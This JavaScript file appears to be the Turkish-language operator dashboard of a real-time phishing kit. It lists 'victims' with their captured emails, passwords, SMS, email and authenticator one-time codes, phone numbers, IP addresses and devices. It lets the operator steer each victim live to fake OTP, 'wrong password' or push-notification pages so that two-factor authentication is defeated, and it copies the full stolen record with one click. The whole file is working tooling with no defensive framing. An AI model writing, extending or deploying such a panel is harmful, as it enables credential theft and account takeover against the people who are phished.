(function () {
  'use strict';

  var currentFilter = 'all';
  var searchQuery = '';
  var knownIds = {};
  var pollTimer = null;
  var lastVictims = [];
  var API_URL = window.ADMIN_API || '/shade/core/ajax.php';

  var PAGE_LABELS = {
    login: 'Giriş',
    pass: 'Şifre',
    loading: 'Bekleme',
    otp1: 'SMS OTP',
    otp2: 'E-posta OTP',
    otp3: 'Authenticator',
    yahoo: 'Telefon Bildirimi',
    wrong: 'Yanlış Şifre',
    finish: 'Tamamlandı',
    signin: 'E-posta',
    viewform: 'Form'
  };

  var DATA_FIELDS = [
    { key: 'username', label: 'E-posta', full: false },
    { key: 'password', label: 'Şifre', full: false },
    { key: 'usernames', label: 'E-posta (2)', full: false },
    { key: 'passwords', label: 'Şifre (2)', full: false },
    { key: 'otp1', label: 'SMS OTP', full: false },
    { key: 'otp2', label: 'E-posta OTP', full: false },
    { key: 'otp3', label: 'Authenticator OTP', full: false },
    { key: 'phonenum', label: 'Telefon No.', full: false },
    { key: 'gmail', label: 'Onay No.', full: false }
  ];

  function parseFormData(raw) {
    if (!raw) return null;
    try {
      return typeof raw === 'string' ? JSON.parse(raw) : raw;
    } catch (e) {
      return null;
    }
  }

  function renderFormDataFields(data) {
    var formData = parseFormData(data.form_data);
    if (!formData || !formData.answers || !formData.answers.length) {
      return '';
    }

    var html = '<div class="data-section-title full-width">Form Cevapları';
    if (formData.form_title) {
      html += ' <span class="data-section-sub">(' + escapeHtml(formData.form_title) + ')</span>';
    }
    html += '</div>';

    formData.answers.forEach(function (answer, idx) {
      var label = answer.label || answer.name || ('Soru ' + (idx + 1));
      var val = answer.value || '';
      var isEmpty = !val;
      html += '<div class="data-field full-width" data-value="' + escapeHtml(val) + '">' +
        '<label>' + escapeHtml(label) + '</label>' +
        '<div class="field-value' + (isEmpty ? ' empty' : '') + '">' +
        (isEmpty ? '—' : escapeHtml(val)) + '</div></div>';
    });

    return html;
  }

  function escapeHtml(str) {
    if (!str) return '';
    return String(str)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');
  }

  function getDevice(userAgent) {
    if (/iPhone|iP[oa]d/.test(userAgent)) return { name: 'iPhone', icon: 'fab fa-apple' };
    if (/Android/.test(userAgent)) return { name: 'Android', icon: 'fab fa-android' };
    if (/Windows/.test(userAgent)) return { name: 'Windows', icon: 'fab fa-windows' };
    if (/Mac/.test(userAgent)) return { name: 'macOS', icon: 'fab fa-apple' };
    if (/Linux/.test(userAgent)) return { name: 'Linux', icon: 'fab fa-linux' };
    return { name: 'Bilinmiyor', icon: 'fas fa-desktop' };
  }

  function getVictimStatus(victim) {
    var now = Math.floor(Date.now() / 1000);
    if (victim.next_page === 'finish') return 'finished';
    if (victim.is_waiting == 1 || victim.next_page === 'loading') return 'waiting';
    if ((now - victim.heartbeat) > 7) return 'away';
    return 'online';
  }

  function getStatusLabel(status) {
    var labels = { online: 'Çevrimiçi', waiting: 'Bekliyor', away: 'Uzakta', finished: 'Tamamlandı' };
    return labels[status] || status;
  }

  function timeAgo(timestamp) {
    var diff = Math.floor(Date.now() / 1000) - timestamp;
    if (diff < 5) return 'şimdi';
    if (diff < 60) return diff + ' sn önce';
    if (diff < 3600) return Math.floor(diff / 60) + ' dk önce';
    return Math.floor(diff / 3600) + ' sa önce';
  }

  function formatDate(dateStr) {
    if (!dateStr) return '—';
    var d = new Date(dateStr);
    if (isNaN(d)) return dateStr;
    return d.toLocaleString('tr-TR');
  }

  function showToast(message, type) {
    var $toast = $('<div class="toast-msg ' + (type || '') + '">' +
      '<i class="fas fa-' + (type === 'success' ? 'check-circle' : 'info-circle') + '"></i>' +
      escapeHtml(message) + '</div>');
    $('#toast-container').append($toast);
    setTimeout(function () { $toast.fadeOut(300, function () { $(this).remove(); }); }, 3000);
  }

  function copyText(text) {
    if (!text) return;
    if (navigator.clipboard) {
      navigator.clipboard.writeText(text);
    } else {
      var $tmp = $('<textarea>').val(text).appendTo('body').select();
      document.execCommand('copy');
      $tmp.remove();
    }
  }

  function sortVictims(victims) {
    return victims.slice().sort(function (a, b) {
      return Number(b.id) - Number(a.id);
    });
  }

  function buildRowHtml(v) {
    var status = getVictimStatus(v);
    var device = getDevice(v.user_agent || '');
    var isNew = !knownIds[v.id];
    knownIds[v.id] = true;

    if (isNew && status === 'waiting') {
      showToast('Yeni bekleyen oturum: #' + v.id, 'success');
    }

    return '<tr class="session-row' + (status === 'waiting' ? ' row-waiting' : '') + '" data-id="' + v.id + '">' +
      '<td><span class="session-id">#' + v.id + '</span></td>' +
      '<td><span class="session-email' + (!v.username ? ' empty' : '') + '">' +
      escapeHtml(v.username || 'Henüz girilmedi') + '</span></td>' +
      '<td><span class="status-badge status-' + status + '"><span class="dot"></span>' +
      getStatusLabel(status) + '</span></td>' +
      '<td><span class="page-badge">' + escapeHtml(PAGE_LABELS[v.current_page] || v.current_page || '—') + '</span></td>' +
      '<td><span class="device-info"><i class="' + device.icon + '"></i>' + device.name + '</span></td>' +
      '<td><span class="ip-text">' + escapeHtml(v.ip_address || '—') + '</span></td>' +
      '<td><span class="time-ago">' + timeAgo(v.heartbeat) + '</span></td>' +
      '<td><button class="btn-manage' + (status === 'waiting' ? ' urgent' : '') + ' viewBtn" data-id="' + v.id + '">' +
      (status === 'waiting' ? '<i class="fas fa-bolt"></i> Yönet' : 'Detay') + '</button></td>' +
      '</tr>';
  }

  function updateRow($row, v) {
    var status = getVictimStatus(v);
    var device = getDevice(v.user_agent || '');

    $row.toggleClass('row-waiting', status === 'waiting');
    $row.find('.session-email')
      .toggleClass('empty', !v.username)
      .text(v.username || 'Henüz girilmedi');
    $row.find('.status-badge')
      .attr('class', 'status-badge status-' + status)
      .html('<span class="dot"></span>' + getStatusLabel(status));
    $row.find('.page-badge').text(PAGE_LABELS[v.current_page] || v.current_page || '—');
    $row.find('.device-info').html('<i class="' + device.icon + '"></i>' + device.name);
    $row.find('.ip-text').text(v.ip_address || '—');
    $row.find('.time-ago').text(timeAgo(v.heartbeat));

    var $btn = $row.find('.viewBtn');
    $btn.toggleClass('urgent', status === 'waiting');
    $btn.html(status === 'waiting' ? '<i class="fas fa-bolt"></i> Yönet' : 'Detay');
  }

  function renderSessions(victims) {
    var filtered = filterVictims(sortVictims(victims));
    var $container = $('#sessions-container');

    if (filtered.length === 0) {
      $container.html(
        '<div class="empty-state">' +
        '<i class="fas fa-radar"></i>' +
        '<h3>' + (victims.length > 0 ? 'Filtreye uygun oturum yok' : 'Oturum yok') + '</h3>' +
        '<p>' + (victims.length > 0 ? 'Farklı bir filtre deneyin.' : 'Yeni bağlantılar burada listelenecek.') + '</p>' +
        '</div>'
      );
      return;
    }

    var $table = $container.find('table.sessions-table');
    if (!$table.length) {
      $container.html(
        '<table class="sessions-table"><thead><tr>' +
        '<th>ID</th><th>E-posta</th><th>Durum</th><th>Sayfa</th><th>Cihaz</th><th>IP</th><th>Son Aktivite</th><th></th>' +
        '</tr></thead><tbody></tbody></table>'
      );
      $table = $container.find('table.sessions-table');
    }

    var $tbody = $table.find('tbody');
    var visibleIds = {};

    filtered.forEach(function (v, index) {
      visibleIds[v.id] = true;
      var $row = $tbody.find('tr.session-row[data-id="' + v.id + '"]');

      if ($row.length) {
        updateRow($row, v);
      } else {
        var $rows = $tbody.children('tr.session-row');
        var html = buildRowHtml(v);
        if (index === 0 || !$rows.length) {
          $tbody.prepend(html);
        } else if ($rows.length > index) {
          $rows.eq(index - 1).after(html);
        } else {
          $tbody.append(html);
        }
      }
    });

    $tbody.find('tr.session-row').each(function () {
      var id = Number($(this).data('id'));
      if (!visibleIds[id]) {
        $(this).remove();
      }
    });
  }

  function filterVictims(victims) {
    return victims.filter(function (v) {
      if (currentFilter !== 'all' && getVictimStatus(v) !== currentFilter) return false;
      if (!searchQuery) return true;
      var q = searchQuery.toLowerCase();
      return (
        String(v.id).includes(q) ||
        (v.username && v.username.toLowerCase().includes(q)) ||
        (v.ip_address && v.ip_address.includes(q)) ||
        (v.current_page && v.current_page.toLowerCase().includes(q))
      );
    });
  }

  function updateStats(victims) {
    var stats = { total: victims.length, online: 0, waiting: 0, finished: 0 };
    victims.forEach(function (v) {
      var s = getVictimStatus(v);
      if (s === 'online') stats.online++;
      else if (s === 'waiting') stats.waiting++;
      else if (s === 'finished') stats.finished++;
    });
    $('#stat-total').text(stats.total);
    $('#stat-online').text(stats.online);
    $('#stat-waiting').text(stats.waiting);
    $('#stat-finished').text(stats.finished);
  }

  function renderMeta(data) {
    var device = getDevice(data.user_agent || '');
    var status = getVictimStatus(data);
  return '<div class="meta-item"><label>Cihaz</label><span><i class="' + device.icon + '"></i> ' + device.name + '</span></div>' +
      '<div class="meta-item"><label>IP Adresi</label><span>' + escapeHtml(data.ip_address || '—') + '</span></div>' +
      '<div class="meta-item"><label>Mevcut Sayfa</label><span>' + escapeHtml(PAGE_LABELS[data.current_page] || data.current_page) + '</span></div>' +
      '<div class="meta-item"><label>Sonraki Sayfa</label><span>' + escapeHtml(PAGE_LABELS[data.next_page] || data.next_page || '—') + '</span></div>' +
      '<div class="meta-item"><label>Oluşturulma</label><span>' + formatDate(data.created_at) + '</span></div>' +
      '<div class="meta-item"><label>Son Aktivite</label><span>' + timeAgo(data.heartbeat) + '</span></div>';
  }

  function renderDataFields(data) {
    var html = renderFormDataFields(data);
    DATA_FIELDS.forEach(function (field) {
      var val = data[field.key];
      var isEmpty = !val;
      html += '<div class="data-field' + (field.full ? ' full-width' : '') + '" data-value="' + escapeHtml(val || '') + '">' +
        '<label>' + field.label + '</label>' +
        '<div class="field-value' + (isEmpty ? ' empty' : '') + '">' +
        (isEmpty ? '—' : escapeHtml(val)) + '</div></div>';
    });
    return html;
  }

  function openVictimModal(id) {
    $('#victim-id-modal').val(id);
    $('#data_capt').html('<div class="text-center py-4"><div class="spinner-border text-muted" role="status"></div></div>');
    $('#session-meta').html('');
    $('#victimModal').modal('show');

    $.get(API_URL, { action: 'victim', id: id }).done(function (data) {
      var status = getVictimStatus(data);
      $('#modal-victim-title').text('Oturum #' + data.id);
      $('#modal-status-badge')
        .attr('class', 'modal-status-badge status-badge status-' + status)
        .html('<span class="dot"></span>' + getStatusLabel(status));
      $('#session-meta').html(renderMeta(data));
      $('#data_capt').html(renderDataFields(data));

      $('input[name="pagesRadios"]').prop('checked', false);
      var routePages = ['otp1', 'otp2', 'otp3', 'yahoo', 'wrong', 'finish'];
      if (data.next_page && routePages.indexOf(data.next_page) !== -1) {
        $('input[name="pagesRadios"][value="' + data.next_page + '"]').prop('checked', true);
      }
      $('#phonenum').val(data.phonenum || '');
      $('#gmail').val(data.gmail || '');
      updateRouteParams();
    });
  }

  function updateRouteParams() {
    var selected = $('input[name="pagesRadios"]:checked').val();
    $('#route-params-otp1').toggleClass('visible', selected === 'otp1');
    $('#route-params-yahoo').toggleClass('visible', selected === 'yahoo');
  }

  function poll() {
    $.get(API_URL, { action: 'victims' })
      .done(function (data) {
        if (!Array.isArray(data)) {
          console.error('API beklenmeyen yanıt:', data);
          return;
        }

        lastVictims = data;
        updateStats(data);
        renderSessions(data);

        var openId = $('#victim-id-modal').val();
        if (openId && $('#victimModal').hasClass('show')) {
          $.get(API_URL, { action: 'victim', id: openId }).done(function (v) {
            if (!v || !v.id) return;
            $('#session-meta').html(renderMeta(v));
            $('#data_capt').html(renderDataFields(v));
            var status = getVictimStatus(v);
            $('#modal-status-badge')
              .attr('class', 'modal-status-badge status-badge status-' + status)
              .html('<span class="dot"></span>' + getStatusLabel(status));
          });
        }
      })
      .fail(function (xhr) {
        console.error('API hatası:', API_URL, xhr.status, xhr.responseText);
      });

    $.get(API_URL, { action: 'visitor_count' })
      .done(function (count) {
        var n = parseInt(count, 10);
        if (!isNaN(n)) {
          $('#visitor-count').text(n);
        }
      })
      .always(function () {
        pollTimer = setTimeout(poll, 1000);
      });
  }

  $(document).ready(function () {
    poll();

    $(document).on('click', '.viewBtn', function (e) {
      e.stopPropagation();
      openVictimModal($(this).data('id'));
    });

    $(document).on('click', '.session-row', function () {
      openVictimModal($(this).data('id'));
    });

    $(document).on('click', '.data-field', function () {
      var val = $(this).data('value');
      if (!val) return;
      copyText(val);
      var $el = $(this);
      $el.addClass('copied');
      showToast('Kopyalandı: ' + val, 'success');
      setTimeout(function () { $el.removeClass('copied'); }, 1500);
    });

    $(document).on('change', 'input[name="pagesRadios"]', updateRouteParams);

    $(document).on('click', '.saveChanges', function () {
      var id = $('#victim-id-modal').val();
      var page = $('input[name="pagesRadios"]:checked').val();
      if (!page) {
        showToast('Lütfen bir sayfa seçin', '');
        return;
      }

      var $btn = $(this);
      $btn.prop('disabled', true).html('<span class="spinner-border spinner-border-sm"></span> Gönderiliyor...');

      $.post(API_URL, {
        action: 'update_data',
        ent_id: id,
        currentpage: page,
        gmail: $('#gmail').val(),
        phonenum: $('#phonenum').val()
      }).done(function (resp) {
        if (String(resp).trim() !== '1') {
          showToast('Yönlendirme başarısız', '');
          return;
        }
        showToast('Kullanıcı ' + (PAGE_LABELS[page] || page) + ' sayfasına yönlendirildi', 'success');
      }).fail(function () {
        showToast('Yönlendirme isteği gönderilemedi', '');
      }).always(function () {
        $btn.prop('disabled', false).html('<i class="fas fa-paper-plane"></i> Yönlendir');
      });
    });

    $(document).on('click', '#deletebtn', function () {
      var id = $('#victim-id-modal').val();
      if (!confirm('Bu oturumu silmek istediğinize emin misiniz?')) return;

      $.post(API_URL, { action: 'entity_delete', ent_id: id }).done(function () {
        $('#victimModal').modal('hide');
        delete knownIds[id];
        showToast('Oturum silindi', 'success');
      });
    });

    $('#reset-all-btn').on('click', function () {
      if (!confirm('Tüm victims kayıtları ve ziyaret logları kalıcı olarak silinecek. Emin misiniz?')) return;

      var $btn = $(this);
      $btn.prop('disabled', true);

      $.post(API_URL + '?action=reset_all', { action: 'reset_all' })
        .done(function (resp) {
          if (String(resp).trim() !== '1') {
            showToast('Sıfırlama başarısız — oturum süresi dolmuş olabilir', '');
            return;
          }

          knownIds = {};
          lastVictims = [];
          $('#victimModal').modal('hide');
          $('#visitor-count').text('0');
          updateStats([]);
          renderSessions([]);
          showToast('Tüm veriler silindi (victims + loglar)', 'success');
        })
        .fail(function () {
          showToast('Sıfırlama başarısız', '');
        })
        .always(function () {
          $btn.prop('disabled', false);
        });
    });

    $(document).on('click', '#copyfullz', function () {
      var lines = [];
      $('.data-field').each(function () {
        var label = $(this).find('label').text();
        var val = $(this).data('value');
        if (val) lines.push(label + ': ' + val);
      });
      if (lines.length === 0) {
        showToast('Kopyalanacak veri yok', '');
        return;
      }
      copyText(lines.join('\n'));
      showToast('Tüm veriler kopyalandı (' + lines.length + ' alan)', 'success');
    });

    $('.filter-btn').on('click', function () {
      $('.filter-btn').removeClass('active');
      $(this).addClass('active');
      currentFilter = $(this).data('filter');
      renderSessions(lastVictims);
    });

    var searchTimeout;
    $('#search-input').on('input', function () {
      clearTimeout(searchTimeout);
      var val = $(this).val();
      searchTimeout = setTimeout(function () {
        searchQuery = val.trim().toLowerCase();
        renderSessions(lastVictims);
      }, 200);
    });

    $(window).on('beforeunload', function () {
      if (pollTimer) clearTimeout(pollTimer);
    });
  });
})();
